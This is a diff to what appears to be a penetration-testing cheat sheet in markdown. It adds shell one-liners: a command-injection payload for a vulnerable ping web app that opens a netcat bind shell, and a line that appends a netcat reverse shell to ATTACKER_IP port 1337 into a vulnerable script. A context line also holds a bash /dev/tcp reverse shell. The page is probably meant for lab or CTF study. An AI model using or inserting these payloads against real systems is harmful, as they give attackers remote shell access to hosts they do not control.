@@ -15,9 +15,16 @@ cat /proc/net/dev
 /bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
 ```
 
-* Another way to get reverse shell with command execution
+* Another way to get bind shell with command execution (vulnerable `ping` web app)
 ```bash
 192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
+```
+
+* One liner reverse shell with `nc`
+```bash
+# Adding a newline to the vulnerable script
+echo >> vulnerable.sh 
+echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc ATTACKER_IP 1337 > /tmp/f"
 ```
 
 * TCP scanning with `nc`. `-w` specifies timeout in seconds. 
